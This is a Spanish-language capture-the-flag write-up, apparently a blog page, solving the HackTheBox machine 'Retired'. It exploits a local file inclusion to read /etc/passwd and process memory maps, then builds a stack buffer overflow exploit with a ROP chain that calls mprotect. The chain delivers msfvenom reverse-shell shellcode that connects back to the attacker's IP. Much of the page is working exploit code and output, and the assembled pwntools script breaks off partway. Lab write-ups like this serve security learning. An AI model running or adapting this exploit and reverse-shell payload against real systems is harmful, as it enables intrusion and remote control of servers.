@@ -1,0 +1,654 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Retired HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/retired.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Retired HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Retired de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Retired de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Retired HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Retired HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Retired de la plataforma de HackTheBox","headline":"Writeup Retired HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Retired HackTheBox</h1>
+          <p>Resolución de la máquina Retired de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ nmap</span><span class="p"> 10.10.11.154
+Nmap scan report for 10.10.11.154
+PORT      STATE SERVICE
+22/tcp   open     ssh
+80/tcp   open     http</span>
+</code></pre></div></div>
+<div><p>Si miramos la web encontramos algo interesante, los archivos los gestiona con el argumento page=</p></div>
+<div><p><img src="./1.png"><p></div>
+<div><p>Sabiendo esto podemos probar si se acontece un local file inclusión y efectivamente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ curl</span><span class="p"> "http://10.10.11.154/index.php?page=/etc/passwd" | </span><span class="s2">grep</span><span class="p"> bash
+root:x:0:0:root:/root:/bin/bash
+vagrant:x:1000:1000::/vagrant:/bin/bash
+dev:x:1001:1001::/home/dev:/bin/bash</span>
+</code></pre></div></div>
+<div><p>Además de el lfi encontramos una ruta beta fuzzeando por archivos html</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.154/FUZZ.html -t 100 --hc 404
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                      
+=====================================================================
+000000234:   </span><span class="s2">200</span><span class="p">        72 L     304 W      4144 Ch     "beta"                                                                                       
+</code></pre></div></div>
+<div><p>Si miramos lo que hay encontramos un campo de subir lo que parece ser una "licencia"</p></div>
+<div><p><img src="./2.png"><p></div>
+<div><p>Al intentar subir algo nos redirige a activate_license.php y se queda en blanco, asi que con el lfi veremos en que consiste el php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ curl</span><span class="p"> "http://10.10.11.154/index.php?page=activate_license.php"
+&lt?php
+</span><span class="kd">if</span><span class="p">(</span><span class="kd">isset</span><span class="p">($_FILES[</span><span class="s2">'licensefile'</span><span class="p">])) {
+    $license      </span><span class="kd">= </span><span class="k">file_get_contents</span><span class="p">($_FILES[</span><span class="s2">'licensefile'</span><span class="p">][</span><span class="s2">'tmp_name'</span><span class="p">]);
+    $license_size </span><span class="kd">=</span><span class="p"> $_FILES[</span><span class="s2">'licensefile'</span><span class="p">][</span><span class="s2">'size'</span><span class="p">];
+
+    $socket </span><span class="kd">=</span><span class="p"> </span><span class="k">socket_create</span><span class="p">(</span><span class="na">AF_INET</span><span class="p">, </span><span class="na">SOCK_STREAM</span><span class="p">, </span><span class="na">SOL_TCP</span><span class="p">);
+    </span><span class="kd">if</span><span class="p"> (</span><span class="kd">!</span><span class="p">$socket) { </span><span class="kd">echo</span><span class="s2"> "error socket_create()\n"</span><span class="p">; }
+
+    </span><span class="kd">if</span><span class="p"> (</span><span class="kd">!</span><span class="k">socket_connect</span><span class="p">($socket, </span><span class="s2">'127.0.0.1'</span><span class="p">,</span><span class="na"> 1337</span><span class="p">)) {
+        </span><span class="kd">echo </span><span class="s2">"error socket_connect()"</span><span class="kd"> . </span><span class="k">socket_strerror</span><span class="p">(</span><span class="k">socket_last_error</span><span class="p">()) </span><span class="kd">. </span><span class="s2">"\n"</span><span class="p">;
+    }
+
+    </span><span class="k">socket_write</span><span class="p">($socket, </span><span class="k">pack</span><span class="p">(</span><span class="s2">"N"</span><span class="p">, $license_size));
+    </span><span class="k">socket_write</span><span class="p">($socket, $license);
+
+    </span><span class="k">socket_shutdown</span><span class="p">($socket);
+    </span><span class="k">socket_close</span><span class="p">($socket);
+}
+?></span>
+</code></pre></div></div>
+<div><p>Parece que esta corriendo un servicio en el puerto 1337 en local, esto podemos verlo con el cmdline en /proc si esta actualmente activo, como no lo conocemos podemos buscarlo en el /proc/sched_debug</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ curl</span><span class="p"> "http://10.10.11.154/index.php?page=/proc/sched_debug" | </span><span class="s2">grep </span><span class="p">activate
+S activate_licens   </span><span class="kd">429</span><span class="p">    672686.941830      14     120       0.000000
+</span><span class="s2">❯ curl</span><span class="p"> "http://10.10.11.154/index.php?page=/proc/429/cmdline" --output cmdline
+</span><span class="s2">❯ cat</span><span class="p"> cmdline
+/usr/bin/activate_license 1337</span>
+</code></pre></div></div>
+
+<div><p>Al saber la ruta del archivo podemos descargarlo para asi analicarlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ curl</span><span class="p"> "http://10.10.11.154/index.php?page=/usr/bin/activate_license" --output activate_license</span>
+</span><span class="s2">❯ file</span><span class="p"> activate_license
+activate_license: ELF 64-bit LSB pie executable, x86-64, version 1
+</code></pre></div></div></span>
+
+<div><p>En este punto podemos empezar a jugar con el binario, checksec podemos ver que tiene un par de protecciones</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ checksec</span><span class="p"> activate_license
+[</span><span class="na">*</span><span class="p">] activate_license
+    Arch:     amd64-64-little
+    RELRO:    </span><span class="s2">Full RELRO</span><span class="p">
+    Stack:    </span><span class="kd">No canary found</span><span class="p">
+    NX:       </span><span class="s2">NX enabled</span><span class="p">
+    PIE:      </span><span class="s2">PIE enabled</span><span class="p">
+</code></pre></div></div>
+
+<div><p>Para iniciar con el exploit definiremos el path en /dev/shm/ para lo que necesitemos descargar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">request </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://10.10.11.154/index.php?page={path}"</span><span class="p">, </span><span class="no">allow_redirects</span><span class="kd">=</span><span class="na"></span>False</span><span class="p">)
+rpath </span><span class="kd">=</span><span class="k"> f</span><span class="s2">"/dev/shm/{path.split('/')[-1]}"</span><span class="p">
+</span><span class="kd">with </span><span class="k">open</span><span class="p">(rpath,</span><span class="s2">"wb"</span><span class="p">) </span><span class="kd">as</span><span class="p"> f:
+    f.write(request.content)
+</span><span class="kd">return</span><span class="p"> rpath</span>
+</code></pre></div></div>
+
+<div><p>Aquí simplemente automatizar buscar el pid del proceso como lo hicimos antes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">request </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://10.10.11.154/index.php?page=/proc/sched_debug"</span><span class="p">,</span><span class="no"> allow_redirects</span><span class="kd">=</span><span class="p">False)
+pid </span><span class="kd">= </span><span class="p">re.search(</span><span class="s2">"activate_licens\s+([0-9]+)"</span><span class="p">,request.text).group(</span><span class="na">1</span><span class="p">)
+</span><span class="kd">return </span><span class="p">pid</span>
+</code></pre></div></div>
+
+<div><p>Después simplemente jugar con expresiones regulares para obtener libc, libsqlite, stack, etc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">r </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://10.10.11.154/index.php?page=/proc/{pid}/maps"</span><span class="p">, </span><span class="no">allow_redirects</span><span class="kd">=</span><span class="p">False)
+libcb </span><span class="kd">= </span><span class="k">int</span><span class="p">(re.search(</span><span class="s2">"^.*libc.*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">"-"</span><span class="p">)[</span><span class="na">0</span><span class="p">], </span><span class="na">16</span><span class="p">)
+libcp </span><span class="kd">= </span><span class="p">re.search(</span><span class="s2">"^.*libc.*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">" "</span><span class="p">)[</span><span class="kd">-</span><span class="na">1</span><span class="p">]
+libsb </span><span class="kd">= </span><span class="k">int</span><span class="p">(re.search(</span><span class="s2">"^.*libsqlite.*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">"-"</span><span class="p">)[</span><span class="na">0</span><span class="p">], </span><span class="na">16</span><span class="p">)
+libsp </span><span class="kd">= </span><span class="p">re.search(</span><span class="s2">"^.*libsqlite.*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">" "</span><span class="p">)[</span><span class="kd">-</span><span class="na">1</span><span class="p">]
+sbase </span><span class="kd">= </span><span class="k">int</span><span class="p">(re.search(</span><span class="s2">"^.*\[stack\].*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">"-"</span><span class="p">)[</span><span class="na">0</span><span class="p">], </span><span class="na">16</span><span class="p">)
+ssend </span><span class="kd">= </span><span class="k">int</span><span class="p">(re.search(</span><span class="s2">"^.*\[stack\].*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">"-"</span><span class="p">)[</span><span class="na">1</span><span class="p">].split()[</span><span class="na">0</span><span class="p">], </span><span class="na">16</span><span class="p">)
+</span><span class="kd">return</span><span class="p"> libcb, libcp,libsb, libsp, sbase, ssend</span>
+</code></pre></div></div>
+
+<div><p>Creamos un payload con msfvenom pero manteniendo la ip en una variable para que pueda ser dinámica, la ip sera un input del usuario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ msfvenom</span><span class="p"> -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f py
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of py file: 373 bytes
+buf </span><span class="kd">=  </span><span class="k">b</span><span class="s2">""</span><span class="p">
+buf </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"</span><span class="p">
+buf </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a\x0a\x0a\x51\x48"</span><span class="p">
+buf </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"</span><span class="p">
+buf </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"</span><span class="p">
+buf </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"</span><span class="p">
+buf </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span>
+</code></pre></div></div>
+
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">inip </span><span class="kd">=</span><span class="k"> input</span><span class="p">(</span><span class="s2">"\n[\033[1;34m*\033[1;37m] Introduce tu ip (tun0): "</span><span class="p">)
+ip </span><span class="kd">=</span><span class="p"> socket.inet_aton(inip)
+
+payload </span><span class="kd">=</span><span class="k">  b</span><span class="s2">""</span><span class="p">
+payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"</span><span class="p">
+payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x97\x48\xb9\x02\x00\x01\xbb"</span><span class="kd">  +  </span><span class="p"> ip</span><span class="kd"> + </span><span class="k">  b</span><span class="s2">"\x51\x48"</span><span class="p">
+payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"</span><span class="p">
+payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"</span><span class="p">
+payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"</span><span class="p">
+payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span><span class="p"></span>
+</code></pre></div></div>
+
+<div><p>Definimos las variables con la información obtenida de maps</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">libcb, libcp, libsb, libsp, sbase, ssend </span><span class="p">=</span><span class="p"> adrs(pid)
+
+context.clear(</span><span class="no">arch</span><span class="kd">=</span><span class="s2">'amd64'</span><span class="p">)
+ssize </span><span class="kd">=</span><span class="p"> ssend </span><span class="kd">-</span><span class="p"> sbase
+libc </span><span class="kd">=</span><span class="p"> ELF(file(libcp),</span><span class="no">checksec</span><span class="kd">=</span><span class="p">False)
+libc.address </span><span class="kd">=</span><span class="p"> libcb
+libsql </span><span class="kd">=</span><span class="p"> ELF(file(libsp),</span><span class="no">checksec</span><span class="kd">=</span><span class="p">False)
+libsql.address </span><span class="kd">=</span><span class="p"> libsb
+</code></pre></div></div>
+
+<div><p>Además del mprotect buscamos "rops"  usando las variables definidas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">prt </span><span class="kd">=</span><span class="p"> libc.symbols[</span><span class="s2">'mprotect'</span><span class="p">]
+
+rop </span><span class="kd">=</span><span class="p"> ROP([libc, libsql])
+rdi </span><span class="kd">=</span><span class="p"> rop.rdi[</span><span class="na">0</span><span class="p">]
+rsi </span><span class="kd">=</span><span class="p"> rop.rsi[</span><span class="na">0</span><span class="p">]
+rdx </span><span class="kd">=</span><span class="p"> rop.rdx[</span><span class="na">0</span><span class="p">]
+rsp </span><span class="kd">=</span><span class="p"> rop.jmp_rsp[</span><span class="na">0</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div><p>Es hora de buscar el offset, para eso correremos el php en nuestro equipo local</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "http://10.10.11.154/index.php?page=activate_license.php"</span><span class="p"> --output activate_license.php
+</span><span class="s2">❯ sudo php </span><span class="p">-S 0.0.0.0:80
+PHP Development Server (http://0.0.0.0:80) started</span>
+</code></pre></div></div>
+
+<div><p>Abrimos el binario con gdb-peda, creamos un payload para obtener el offset y correremos el programa</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gdb-peda</span><span class="p"> --args ./activate_license 1337
+Reading symbols from </span><span class="s2">./activate_license</span><span class="p">...
+</span><span class="kd">(gdb-peda)</span><span class="p"> pattern_create 750
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRAB'
+</span><span class="kd">(gdb-peda)</span><span class="p"> run
+Starting program: ~/activate_license 1337
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+[+] starting server listening on port 1337
+[+] listening ...</span>
+</code></pre></div></div>
+
+<div><p>Con python crearemos una petición con el payload como archivo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p">
+Python 3.10.0 on linux
+</span><span class="kd">>>></span><span class="p"> import requests
+</span><span class="kd">>>></span><span class="p"> payload = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRAB'
+</span><span class="kd">>>></span><span class="p"> requests.post(f"http://localhost/activate_license.php", files = { "licensefile": payload } )
+&ltResponse [200]>
+</span><span class="kd">>>></span>
+</code></pre></div></div>
+
+<div><p>Volvemos al gdb y ahora podemos ver el valor del offset</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">[+] listening ...
+[+] accepted client connection from 0.0.0.0:0
+[+] reading 750 bytes
+[+] activated license: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRAB
+</span><span class="na">[------------------------------------------------------------------------------]</span><span class="kd">
+(gdb-peda) </span><span class="p">x/wx $rsp
+0x7fffffffe598:	0x416a7341
+</span><span class="kd">(gdb-peda)</span><span class="p"> pattern_offset 0x416a7341
+1097495361 found at offset: </span><span class="kd">520
+(gdb-peda)</span>
+</code></pre></div></div>
+
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">offset </span><span class="kd">=</span><span class="na"> 520</span>
+</code></pre></div></div>
+
+
+
+<div><p>Ahora queda con lo anterior crear el exploit que vamos a enviar, quedaria de la siguiente forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">exploit </span><span class="kd">= </span><span class="k">b</span><span class="s2">'A'</span><span class="kd"> *</span><span class="p"> offset
+exploit </span><span class="kd">+= </span><span class="p">p64(rdi)</span><span class="kd"> + </span><span class="p">p64(sbase)
+exploit </span><span class="kd">+= </span><span class="p">p64(rsi)</span><span class="kd"> + </span><span class="p">p64(ssize)
+exploit </span><span class="kd">+= </span><span class="p">p64(rdx)</span><span class="kd"> + </span><span class="p">p64(</span><span class="na">7</span><span class="p">)
+exploit </span><span class="kd">+= </span><span class="p">p64(prt)
+exploit </span><span class="kd">+= </span><span class="p">p64(rsp)
+exploit </span><span class="kd">+= </span><span class="p">payload</span>
+</code></pre></div></div>
+
+<div><p>Simplemente nos queda enviar el archivo, lo haremos con el request en un hilo para estar en escucha y recibir la shell en el mismo exploit, además de cambiar la TERM para poder hacer "clear"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">requests.post(</span><span class="k">f</span><span class="s2">"http://10.10.11.154/activate_license.php"</span><span class="p">, </span><span class="no">files </span><span class="kd">=</span><span class="p"> { </span><span class="s2">"licensefile"</span><span class="p">: exploit } )
+
+threading.Thread(</span><span class="no">target</span><span class="kd">=</span><span class="p">bof, </span><span class="no">args</span><span class="kd">=</span><span class="p">()).start()
+shell </span><span class="kd">=</span><span class="p"> listen(</span><span class="na">443</span><span class="p">, </span><span class="no">timeout</span><span class="kd">=</span><span class="na">60</span><span class="p">).wait_for_connection()
+shell.sendline(</span><span class="k">b</span><span class="s2">"export TERM=xterm HOME=/var/www"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div>
+
+<div><p>Finalmente con todo lo anterior solo nos queda compactarlo y nos quedaría algo como esto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">import</span><span class="p"> requests
+</span><span class="kd">from</span><span class="p"> pwn </span><span class="kd">import</span><span class="p"> *
+
+inip </span><span class="kd">=</span><span class="k"> input</span><span class="p">(</span><span class="s2">"\n[\033[1;34m*\033[1;37m] Introduce tu ip (tun0): "</span><span class="p">)
+
+</span><span class="k">def file</span><span class="p">(</span><span class="no">path</span><span class="p">):
+    request </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://10.10.11.154/index.php?page={path}"</span><span class="p">, </span><span class="no">allow_redirects</span><span class="kd">=</span><span class="na"></span>False</span><span class="p">)
+    rpath </span><span class="kd">=</span><span class="k"> f</span><span class="s2">"/dev/shm/{path.split('/')[-1]}"</span><span class="p">
+    </span><span class="kd">with </span><span class="k">open</span><span class="p">(rpath,</span><span class="s2">"wb"</span><span class="p">) </span><span class="kd">as</span><span class="p"> f:
+        f.write(request.content)
+    </span><span class="kd">return</span><span class="p"> rpath
+
+</span><span class="k">def rpid</span><span class="p">():
+    request </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://10.10.11.154/index.php?page=/proc/sched_debug"</span><span class="p">,</span><span class="no"> allow_redirects</span><span class="kd">=</span><span class="p">False)
+    pid </span><span class="kd">= </span><span class="p">re.search(</span><span class="s2">"activate_licens\s+([0-9]+)"</span><span class="p">,request.text).group(</span><span class="na">1</span><span class="p">)
+    </span><span class="kd">return </span><span class="p">pid
+
+</span><span class="k">def adrs</span><span class="p">(</span><span class="no">pid</span><span class="p">):
+    r </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://10.10.11.154/index.php?page=/proc/{pid}/maps"</span><span class="p">, </span><span class="no">allow_redirects</span><span class="kd">=</span><span class="p">False)
+    libcb </span><span class="kd">= </span><span class="k">int</span><span class="p">(re.search(</span><span class="s2">"^.*libc.*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">"-"</span><span class="p">)[</span><span class="na">0</span><span class="p">], </span><span class="na">16</span><span class="p">)
+    libcp </span><span class="kd">= </span><span class="p">re.search(</span><span class="s2">"^.*libc.*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">" "</span><span class="p">)[</span><span class="kd">-</span><span class="na">1</span><span class="p">]
+    libsb </span><span class="kd">= </span><span class="k">int</span><span class="p">(re.search(</span><span class="s2">"^.*libsqlite.*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">"-"</span><span class="p">)[</span><span class="na">0</span><span class="p">], </span><span class="na">16</span><span class="p">)
+    libsp </span><span class="kd">= </span><span class="p">re.search(</span><span class="s2">"^.*libsqlite.*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">" "</span><span class="p">)[</span><span class="kd">-</span><span class="na">1</span><span class="p">]
+    sbase </span><span class="kd">= </span><span class="k">int</span><span class="p">(re.search(</span><span class="s2">"^.*\[stack\].*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">"-"</span><span class="p">)[</span><span class="na">0</span><span class="p">], </span><span class="na">16</span><span class="p">)
+    ssend </span><span class="kd">= </span><span class="k">int</span><span class="p">(re.search(</span><span class="s2">"^.*\[stack\].*$"</span><span class="p">, r.text, re.M).group(</span><span class="na">0</span><span class="p">).split(</span><span class="s2">"-"</span><span class="p">)[</span><span class="na">1</span><span class="p">].split()[</span><span class="na">0</span><span class="p">], </span><span class="na">16</span><span class="p">)
+    </span><span class="kd">return</span><span class="p"> libcb, libcp,libsb, libsp, sbase, ssend</span>
+
+<span class="k">def bof</span><span class="p">():
+    ip </span><span class="kd">=</span><span class="p"> socket.inet_aton(inip)
+    payload </span><span class="kd">=</span><span class="k">  b</span><span class="s2">""</span><span class="p">
+    payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"</span><span class="p">
+    payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x97\x48\xb9\x02\x00\x01\xbb"</span><span class="kd">  +  </span><span class="p"> ip</span><span class="kd"> + </span><span class="k">  b</span><span class="s2">"\x51\x48"</span><span class="p">
+    payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"</span><span class="p">
+    payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"</span><span class="p">
+    payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"</span><span class="p">
+    payload </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span><span class="p">
+
+    pid </span><span class="kd">=</span><span class="p"> rpid()
+
+    libcb, libcp, libsb, libsp, sbase, ssend </span><span class="p">=</span><span class="p"> adrs(pid)
+
